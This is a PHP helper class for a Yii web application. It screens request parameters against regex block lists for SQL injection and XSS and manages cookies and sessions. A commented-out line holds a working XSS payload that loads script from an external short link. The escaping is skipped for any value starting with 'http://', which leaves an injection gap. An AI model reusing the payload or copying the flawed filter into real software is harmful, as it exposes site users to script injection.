<?php

/**
 * User: Silen
 * Date: 14-1-6
 * Time: 下午7:15
 */

namespace components;
use Yii;
class Func {

    /**
     * 检查 GET POST COOKIE SERVER 是否有非法请求，有则返回false
     *
     * @return unknown
     */
    public static function checkQueryParams() {
        $getfilter = "'|(and|or)\\b.+?(>|<|=|in|like)|\\/\\*.+?\\*\\/|<\\s*.*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
        $postfilter = "\\b(and|or)\\b.{1,6}?(=|>|<|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|<\\s*.*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
        $cookiefilter = "\\b(and|or)\\b.{1,6}?(=|>|<|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|<\\s*.*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
        $serverfilter = "<\\s*.*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
        //新增 XSS Filter Evasion Cheat Sheet
        //$filterHtml  = "<\\s*.*iframe\\b|<\\s*.*script\\b|<\\s*.*src\\b=|<\\s*.*BODY\\s*.*onload";
        $filterHtml = "<\\s*.*input\\b|\\s*\:\\s*expression\\s*\(\\s*|<\\s*.*script\\b|<\\s*.*iframe\\b|<\\s*.*src\\b=|<\\s*.*marquee\\b=|<\\s*.*BODY\\s*.*onload";
//         $_POST['OrderAddForm']['idPicUrlA']='xxxx" onerror=document.body.appendChild(createElement(/script/.source)).src=alt alt=//t.cn/Rzne6NN x=x"';
//         var_dump($_POST);exit;
        //过滤html标签中的尖括号替换成半圆括号
        $bbsFilter = "/^http:\/\//";
        foreach ($_GET as $key => $value) {
            if (!self::stopAttack($key, $value, $getfilter)) {
                return false;
            }
            if (!self::stopAttack($key, $value, $filterHtml)) {
                return false;
            }
            //转义字符中的html
            if (is_array($value)) {
                foreach ($value as $keys => $valueTwo) {
                    if (!is_array($valueTwo)) {
                        $_GET[$key][$keys] = htmlspecialchars($valueTwo);
                        $ate = preg_match($bbsFilter, $valueTwo);
                        if ($ate > 0 && !empty($valueTwo)) {
                            $_GET[$key][$keys] = str_replace('&amp;', '&', $valueTwo);
                        }
                    }
                }
            } else {
                $_GET[$key] = htmlspecialchars($value);
                $ate = preg_match($bbsFilter, $value);
                if ($ate > 0 && !empty($value)) {
                    $_GET[$key] = str_replace('&amp;', '&', $value);
                }
            }
        }
        foreach ($_POST as $key => $value) {
            if (!self::stopAttack($key, $value, $postfilter)) {
                return false;
            }
            if (!self::stopAttack($key, $value, $filterHtml)) {
                return false;
            }
            //转义字符中的html
            if (is_array($value)) {
                foreach ($value as $keys => $valueTwo) {
                    if (!is_array($valueTwo)) {
                        $_POST[$key][$keys] = htmlspecialchars($valueTwo);
                        $ate = preg_match($bbsFilter, $valueTwo);
                        if ($ate > 0 && !empty($valueTwo)) {
                            $_POST[$key][$keys] = str_replace('&amp;', '&', $valueTwo);
                        }
                    }
                }
            } else {
                $_POST[$key] = htmlspecialchars($value);
                $ate = preg_match($bbsFilter, $value);
                if ($ate > 0 && !empty($value)) {
                    $_POST[$key] = str_replace('&amp;', '&', $value);
                }
            }
        }
        foreach ($_COOKIE as $key => $value) {
            if (!self::stopAttack($key, $value, $cookiefilter)) {
                return false;
            }
            if (!self::stopAttack($key, $value, $filterHtml)) {
                return false;
            }
        }
        foreach ($_SERVER as $key => $value) {
            if (!self::stopAttack($key, $value, $serverfilter)) {
                return false;
            }
            if (!self::stopAttack($key, $value, $filterHtml)) {
                return false;
            }
        }
//          var_dump($_POST);exit;
        return true;
    }

    /**
     * 检查是否有非法请求参数
     *
     * @param unknown_type $StrFiltKey
     * @param unknown_type $filtValue
     * @param unknown_type $ArrFiltReq
     * @return unknown
     */
    public static function stopAttack($StrFiltKey, $filtValue, $ArrFiltReq) {
        $strCheck = '';
        if (is_array($filtValue)) {
            $strCheck .= self::recursiveImplode($filtValue);
        } else {
            $strCheck = urldecode($filtValue);
        }
        //echo $strCheck;
        if (preg_match("/" . $ArrFiltReq . "/is", $strCheck) == 1) {
            return false;
        }
        return true;
    }

    /**
     * 递归拼接数组
     *
     * @param unknown_type $arr
     * @return unknown
     */
    public static function recursiveImplode($arr) {
        $str = '';
        if (!is_array($arr)) {
            return $str;
        }
        foreach ($arr as $k => $t) {
            if (is_array($t)) {
                $str .= self::recursiveImplode($t);
            } else {
                $str .= $k . $t;
            }
        }
        return $str;
    }
    
    /**
     * 提取cookies信息
     *
     * @return multitype: array
     */
    public static function getCookiesUserInfo($nameArry) {
        
        $cookieArry = array();
        $cookies = Yii::$app->request->cookies;
        if(is_array($nameArry) && !empty($nameArry)){
            foreach ($nameArry as $name){
               if (!$cookies->has(WEBSITENAME.$name)) {
                    return array();
                }else{
                    $cookieArry[$name] = $cookies->getValue(WEBSITENAME.$name, '');
                }
            }
        }else{
            return array();
        }
        return $cookieArry;
    }

    /**
     * 设置cookies信息
     *
     * @param unknown $dataList        	
     */
    public static function setCookiesUserInfo($dataList, $time = 7200) {
        foreach ($dataList as $k => $v) {
            self::setCookiesAte(WEBSITENAME.$k, $v, $time);
        }
    }

    /**
     * 设置cookiese信息
     */
     public static function setCookiesAte($name = '', $value = '', $time = 3600) {
        $cookies = Yii::$app->response->cookies;
        $cookies->add(new \yii\web\Cookie([
            'name' => $name,
            'value' => $value,
            'expire' => time() + $time
        ]));
    }
    
    //设置session
    public static function setSession($sarray) {
        $session = Yii::$app->session;
        $session->open();
        foreach ($sarray as $k => $v) {
            $session[$k] = strtolower($v);
        }
    }

    //获取session
    public static function getSession($skey) {

        $session = Yii::$app->session;
        $session->open();
        $code = null;

        if (!empty($session[$skey])) {
            $code = $session[$skey];
        } 
        return $code;
    }

    /**
     * 清楚session
     */
    public static function clearSession($skey) {
        $session = Yii::$app->session;
        $session->open();
        $name = $skey;
        unset($session[$name]);
    }
    
    


}
